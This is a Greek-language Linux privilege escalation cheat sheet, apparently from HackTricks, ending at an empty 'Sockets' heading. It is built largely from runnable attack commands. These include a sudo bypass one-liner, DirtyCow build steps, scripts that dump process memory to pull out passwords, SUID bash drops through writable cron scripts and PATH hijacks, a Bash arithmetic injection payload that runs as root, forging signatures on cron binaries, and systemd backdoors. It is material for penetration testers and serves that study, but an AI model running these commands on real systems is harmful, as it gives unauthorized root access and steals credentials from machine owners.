# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Πληροφορίες Συστήματος

### Πληροφορίες OS

Ας αρχίσουμε να αποκτούμε κάποιες γνώσεις για το λειτουργικό σύστημα που τρέχει
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Εάν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`, μπορεί να καταφέρετε να καταλάβετε κάποιες βιβλιοθήκες ή binaries:
```bash
echo $PATH
```
### Πληροφορίες Env

Υπάρχουν ενδιαφέρουσες πληροφορίες, passwords ή API keys στις μεταβλητές περιβάλλοντος;
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την kernel version και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για να escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή λίστα ευάλωτων πυρήνων και μερικά ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Άλλοι ιστότοποι όπου μπορείτε να βρείτε μερικά **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξάγετε όλες τις ευάλωτες εκδόσεις πυρήνα από αυτόν τον ιστότοπο μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτελέστε IN victim, ελέγχει μόνο exploits για kernel 2.x)

Always **αναζητήστε την έκδοση του kernel στο Google**, ίσως η έκδοση του kernel σας να αναφέρεται σε κάποιο kernel exploit και τότε θα είστε σίγουροι ότι αυτό το exploit είναι έγκυρο.

Επιπλέον kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Βασισμένο στις ευάλωτες εκδόσεις του sudo που εμφανίζονται σε:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Οι εκδόσεις του Sudo πριν από την 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) επιτρέπουν σε μη προνομιούχους τοπικούς χρήστες να αναβαθμίσουν τα προνόμιά τους σε root μέσω της επιλογής sudo `--chroot` όταν το αρχείο `/etc/nsswitch.conf` χρησιμοποιείται από έναν κατάλογο ελεγχόμενο από τον χρήστη.

Εδώ είναι ένα [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) για να εκμεταλλευτείτε αυτήν την [ευπάθεια](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν τρέξετε το exploit, βεβαιωθείτε ότι η έκδοση του `sudo` σας είναι ευάλωτη και ότι υποστηρίζει τη λειτουργία `chroot`.

Για περισσότερες πληροφορίες, ανατρέξτε στην πρωτότυπη [ανακοίνωση ευπάθειας](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Από @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Ελέγξτε το **smasher2 box of HTB** για ένα **παράδειγμα** του πώς αυτή η vuln θα μπορούσε να εκμεταλλευθεί.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περισσότερη απογραφή συστήματος
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Καταγραφή πιθανών αμυνών

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Αν βρίσκεστε μέσα σε ένα docker container μπορείτε να προσπαθήσετε να διαφύγετε από αυτό:


{{#ref}}
docker-security/
{{#endref}}

## Δίσκοι

Ελέγξτε **τι είναι mounted και unmounted**, πού και γιατί. Αν κάτι είναι unmounted, μπορείτε να προσπαθήσετε να το mount και να ελέγξετε για ιδιωτικές πληροφορίες
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Απαριθμήστε χρήσιμα binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, ελέγξτε αν **έχει εγκατασταθεί οποιοσδήποτε compiler**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσετε κάποιο kernel exploit, καθώς συνιστάται να το compile στη μηχανή όπου θα το χρησιμοποιήσετε (ή σε μία παρόμοια).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Εγκατεστημένο ευάλωτο λογισμικό

Ελέγξτε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα) που θα μπορούσε να αξιοποιηθεί για escalating privileges…\
Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Αν έχετε SSH πρόσβαση στη μηχανή, μπορείτε επίσης να χρησιμοποιήσετε **openVAS** για να ελέγξετε για ξεπερασμένο και ευάλωτο λογισμικό που είναι εγκατεστημένο στη μηχανή.

> [!NOTE] > _Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που σε μεγάλο βαθμό θα είναι άχρηστες, επομένως συνιστώνται εφαρμογές όπως OpenVAS ή παρόμοιες που θα ελέγξουν αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_

## Διεργασίες

Ρίξτε μια ματιά σε **ποιες διεργασίες** εκτελούνται και ελέγξτε αν κάποια διεργασία έχει **περισσότερα προνόμια απ' ό,τι θα έπρεπε** (ίσως ένα tomcat να εκτελείται από root?)
```bash
ps aux
ps -ef
top -n 1
```
Να ελέγχετε πάντα για πιθανές [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). Το **Linpeas** τα εντοπίζει ελέγχοντας την παράμετρο `--inspect` στη γραμμή εντολών της διαδικασίας.  
Επίσης **check your privileges over the processes binaries**, ίσως μπορείτε να τα αντικαταστήσετε.

### Process monitoring

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθείτε διεργασίες. Αυτό μπορεί να είναι πολύ χρήσιμο για να εντοπίσετε ευάλωτες διεργασίες που εκτελούνται συχνά ή όταν πληρούνται ορισμένες προϋποθέσεις.

### Process memory

Κάποιες υπηρεσίες ενός server αποθηκεύουν **διαπιστευτήρια σε απλό κείμενο στη μνήμη**.  
Συνήθως θα χρειαστείτε **root privileges** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες, γι' αυτό αυτό είναι συνήθως πιο χρήσιμο όταν είστε ήδη root και θέλετε να ανακαλύψετε περισσότερα διαπιστευτήρια.  
Ωστόσο, θυμηθείτε ότι **ως κανονικός χρήστης μπορείτε να διαβάσετε τη μνήμη των διεργασιών που σας ανήκουν**.

> [!WARNING]
> Σημειώστε ότι σήμερα οι περισσότερες μηχανές δεν επιτρέπουν το ptrace από προεπιλογή, πράγμα που σημαίνει ότι δεν μπορείτε να dump άλλες διεργασίες που ανήκουν στον μη-privileged χρήστη σας.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: όλες οι διεργασίες μπορούν να γίνουν debug, αρκεί να έχουν το ίδιο uid. Αυτός είναι ο κλασικός τρόπος που λειτουργούσε το ptracing.
> - **kernel.yama.ptrace_scope = 1**: μόνο η γονική διεργασία μπορεί να γίνει debug.
> - **kernel.yama.ptrace_scope = 2**: Μόνο ο admin μπορεί να χρησιμοποιήσει ptrace, καθώς απαιτείται η ικανότητα CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Καμία διεργασία δεν μπορεί να παρακολουθηθεί με ptrace. Μόλις οριστεί, απαιτείται επανεκκίνηση για να ενεργοποιηθεί ξανά το ptracing.

#### GDB

Αν έχετε πρόσβαση στη μνήμη μιας υπηρεσίας FTP (για παράδειγμα) μπορείτε να εξάγετε το Heap και να ψάξετε μέσα για τα διαπιστευτήρια.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Σενάριο
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Για ένα δεδομένο process ID, **τα maps δείχνουν πώς η μνήμη αντιστοιχίζεται μέσα στον εικονικό χώρο διευθύνσεων αυτής της διεργασίας**· δείχνουν επίσης τα **δικαιώματα κάθε αντιστοιχισμένης περιοχής**. Το ψευδο-αρχείο **mem** **αποκαλύπτει την ίδια τη μνήμη της διεργασίας**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τις μετατοπίσεις τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **κάνουμε seek στο αρχείο mem και να αποθηκεύσουμε όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του kernel μπορεί να προσπελαστεί χρησιμοποιώντας /dev/kmem.\  
Τυπικά, `/dev/mem` είναι αναγνώσιμο μόνο από **root** και την ομάδα **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για linux

Το ProcDump είναι μια έκδοση για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Βρείτε το στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για να dump τη μνήμη μιας διεργασίας μπορείτε να χρησιμοποιήσετε:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε χειροκίνητα να αφαιρέσετε τις απαιτήσεις root και να dump τη διεργασία που σας ανήκει
- Script A.5 από [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από τη μνήμη διεργασίας

#### Χειροκίνητο παράδειγμα

Αν βρείτε ότι η διεργασία authenticator εκτελείται:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να dump τη διαδικασία (βλέπε τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους για να dump τη μνήμη μιας διαδικασίας) και να αναζητήσετε διαπιστευτήρια μέσα στη μνήμη:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **κλέψει διαπιστευτήρια σε απλό κείμενο από τη μνήμη** και από ορισμένα **γνωστά αρχεία**. Απαιτεί δικαιώματα root για να λειτουργήσει σωστά.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένα/Cron jobs

### Crontab UI (alseambusher) που τρέχει ως root – web-based scheduler privesc

Αν ένα web “Crontab UI” panel (alseambusher/crontab-ui) τρέχει ως root και είναι συνδεδεμένο μόνο στο loopback, μπορείτε παρόλα αυτά να το προσεγγίσετε μέσω SSH local port-forwarding και να δημιουργήσετε ένα privileged job για privesc.

Τυπική αλυσίδα
- Εντοπίστε port προσβάσιμο μόνο από loopback (π.χ., 127.0.0.1:8000) και το Basic-Auth realm μέσω `ss -ntlp` / `curl -v localhost:8000`
- Βρείτε credentials σε operational artifacts:
  - Backups/scripts με `zip -P <password>`
  - systemd unit που εκθέτει `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Δημιούργησε ένα high-priv job και εκτέλεσέ το αμέσως (ρίχνει SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Χρησιμοποιήστε το:
```bash
/tmp/rootshell -p   # root shell
```
Σκληροποίηση
- Μην τρέχετε Crontab UI ως root; περιορίστε το με έναν dedicated user και ελάχιστα δικαιώματα
- Bind σε localhost και επιπλέον περιορίστε την πρόσβαση μέσω firewall/VPN; μην επαναχρησιμοποιείτε κωδικούς πρόσβασης
- Αποφύγετε την ενσωμάτωση secrets σε unit files; χρησιμοποιήστε secret stores ή root-only EnvironmentFile
- Ενεργοποιήστε audit/logging για on-demand job executions

Ελέγξτε αν κάποια scheduled job είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από root (wildcard vuln? μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο root; να χρησιμοποιήσετε symlinks; να δημιουργήσετε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί ο root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Διαδρομή Cron

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείς να βρεις το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Παρατήρησε ότι ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Εάν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το PATH. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείς να αποκτήσεις ένα root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron που χρησιμοποιεί ένα script με wildcard (Wildcard Injection)

Αν ένα script που εκτελείται από root έχει ένα “**\***” μέσα σε μια εντολή, μπορείτε να το εκμεταλλευτείτε για να προκαλέσετε απρόβλεπτες ενέργειες (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Αν το wildcard προηγείται ενός μονοπατιού όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ακόμη και** _**./\***_ **δεν είναι).**

Διαβάστε την ακόλουθη σελίδα για περισσότερα κόλπα εκμετάλλευσης wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. Αν ένας root cron/parser διαβάζει μη αξιόπιστα πεδία log και τα περνάει σε ένα arithmetic context, ένας attacker μπορεί να εγχύσει ένα command substitution $(...) που εκτελείται ως root όταν τρέξει το cron.

- Γιατί δουλεύει: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Έτσι, μια τιμή όπως `$(/bin/bash -c 'id > /tmp/pwn')0` αντικαθίσταται πρώτα (εκτελώντας την εντολή), και το υπόλοιπο αριθμητικό `0` χρησιμοποιείται για την arithmetic ώστε το script να συνεχίσει χωρίς σφάλματα.

- Τυπικό ευάλωτο πρότυπο:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Εκμετάλλευση: Γράψτε attacker-controlled κείμενο στο parsed log ώστε το πεδίο που μοιάζει αριθμητικό να περιέχει ένα command substitution και να τελειώνει με ψηφίο. Βεβαιωθείτε ότι η εντολή σας δεν γράφει στο stdout (ή κάντε redirect) ώστε η arithmetic να παραμείνει έγκυρη.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Αν μπορείτε **να τροποποιήσετε ένα cron script** που εκτελείται ως root, μπορείτε να αποκτήσετε ένα shell πολύ εύκολα:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Εάν το script που εκτελείται από root χρησιμοποιεί έναν **directory όπου έχετε πλήρη πρόσβαση**, ίσως να είναι χρήσιμο να διαγράψετε αυτόν τον φάκελο και να **δημιουργήσετε ένα symlink folder προς κάποιον άλλο** που θα εξυπηρετεί ένα script υπό τον έλεγχό σας.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Οι blue teams μερικές φορές "sign" binary που τρέχουν μέσω cron με το να αποθηκεύουν ένα custom ELF section και να κάνουν grep για ένα vendor string πριν τα εκτελέσουν ως root. Αν το binary είναι group-writable (π.χ., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) και μπορείς να leak το signing material, μπορείς να σφυρηλατήσεις το section και να hijack-άρεις το cron task:

1. Χρησιμοποίησε `pspy` για να καταγράψεις τη ροή επαλήθευσης. Στην Era, ο root εκτέλεσε `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ακολουθούμενο από `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` και στη συνέχεια εκτέλεσε το αρχείο.
2. Αναδημιούργησε το αναμενόμενο πιστοποιητικό χρησιμοποιώντας το leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Δημιούργησε ένα κακόβουλο αντικαταστατικό binary (π.χ., drop a SUID bash, add your SSH key) και ενσωμάτωσε το πιστοποιητικό στο `.text_sig` ώστε το grep να περνάει:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Αντικατέστησε το προγραμματισμένο binary διατηρώντας τα execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Περίμενε την επόμενη εκτέλεση του cron· μόλις ο πρόχειρος έλεγχος υπογραφής succeeds, το payload σου τρέχει ως root.

### Frequent cron jobs

Μπορείς να παρακολουθήσεις τις διεργασίες για να εντοπίσεις διεργασίες που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορέσεις να εκμεταλλευτείς αυτό και να αναβαθμίσεις προνόμια.

For example, to **παρακολουθείς κάθε 0.1s για 1 λεπτό**, **ταξινομείς με βάση τις λιγότερο εκτελεσμένες εντολές** και να διαγράψεις τις εντολές που έχουν εκτελεστεί πιο πολύ, μπορείς να κάνεις:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα απαριθμεί κάθε process που ξεκινά).

### Αόρατα cron jobs

Είναι δυνατόν να δημιουργηθεί ένα cronjob **βάζοντας ένα carriage return μετά από ένα σχόλιο** (χωρίς χαρακτήρα newline), και το cron job θα λειτουργήσει. Παράδειγμα (σημειώστε το χαρακτήρα carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Υπηρεσίες

### Αρχεία _.service_ με δικαίωμα εγγραφής

Έλεγξε αν μπορείς να γράψεις οποιοδήποτε αρχείο `.service`, αν μπορείς, **θα μπορούσες να το τροποποιήσεις** ώστε να **εκτελεί** το **backdoor σου όταν** η υπηρεσία **ξεκινάει**, **επανεκκινείται** ή **σταματάει** (ίσως χρειαστεί να περιμένεις μέχρι να γίνει επανεκκίνηση της μηχανής).\
Για παράδειγμα δημιούργησε το backdoor σου μέσα στο `.service` αρχείο με **`ExecStart=/tmp/script.sh`**

### Εκτελέσιμα αρχεία υπηρεσίας με δικαίωμα εγγραφής

Να έχεις υπόψη ότι αν έχεις **δικαιώματα εγγραφής σε binaries που εκτελούνται από υπηρεσίες**, μπορείς να τα αλλάξεις για backdoors έτσι ώστε όταν οι υπηρεσίες εκτελεστούν ξανά τα backdoors να εκτελεστούν.

### systemd PATH - Relative Paths

Μπορείς να δεις το PATH που χρησιμοποιεί ο **systemd** με:
```bash
systemctl show-environment
```
Εάν βρείτε ότι μπορείτε να **write** σε οποιονδήποτε από τους φακέλους της διαδρομής, μπορεί να είστε σε θέση να **escalate privileges**. Πρέπει να αναζητήσετε αρχεία ρυθμίσεων υπηρεσιών που χρησιμοποιούν **σχετικές διαδρομές** όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Στη συνέχεια, δημιούργησε ένα **εκτελέσιμο** με το **ίδιο όνομα με το relative path binary** μέσα στον φάκελο PATH του systemd στον οποίο μπορείς να γράψεις, και όταν η υπηρεσία ζητηθεί να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), το **backdoor σου θα εκτελεστεί** (οι μη προνομιούχοι χρήστες συνήθως δεν μπορούν να start/stop services αλλά έλεγξε αν μπορείς να χρησιμοποιήσεις `sudo -l`).

**Μάθε περισσότερα για τις υπηρεσίες με `man systemd.service`.**

## **Timers**

Οι Timers είναι αρχεία unit του systemd των οποίων το όνομα λήγει σε `.timer` και που ελέγχουν αρχεία ή γεγονότα `.service`. Οι Timers μπορούν να χρησιμοποιηθούν ως εναλλακτική του cron, καθώς έχουν ενσωματωμένη υποστήριξη για γεγονότα ημερολογιακού χρόνου και γεγονότα μονοτονικού χρόνου και μπορούν να τρέξουν ασύγχρονα.

Μπορείς να απαριθμήσεις όλους τους Timers με:
```bash
systemctl list-timers --all
```
### Εγγράψιμοι timers

Εάν μπορείτε να τροποποιήσετε έναν timer μπορείτε να τον κάνετε να εκτελέσει μερικά υπάρχοντα αντικείμενα systemd.unit (όπως ένα `.service` ή ένα `.target`)
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι η Unit:

> Η μονάδα που θα ενεργοποιηθεί όταν αυτός ο timer λήξει. Το όρισμα είναι ένα όνομα μονάδας, του οποίου το επίθημα δεν είναι ".timer". Αν δεν καθοριστεί, αυτή η τιμή προεπιλέγεται σε μια service που έχει το ίδιο όνομα με τη μονάδα timer, εκτός από το επίθημα. (Βλέπε παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της μονάδας της timer να έχουν το ίδιο όνομα, εκτός από το επίθημα.

Therefore, to abuse this permission you would need to:

- Βρείτε κάποια systemd μονάδα (όπως ένα `.service`) που είναι **εκτελεί εγγράψιμο δυαδικό αρχείο**
- Βρείτε κάποια systemd μονάδα που **εκτελεί σχετική διαδρομή** και έχετε **δικαιώματα εγγραφής** στο **systemd PATH** (για να μιμηθείτε αυτό το εκτελέσιμο)

**Μάθετε περισσότερα για τους timers με το `man systemd.timer`.**

### **Ενεργοποίηση Timer**

Για να ενεργοποιήσετε έναν timer χρειάζεστε δικαιώματα root και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημειώστε ότι το **timer** **ενεργοποιείται** δημιουργώντας έναν symlink προς αυτό στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

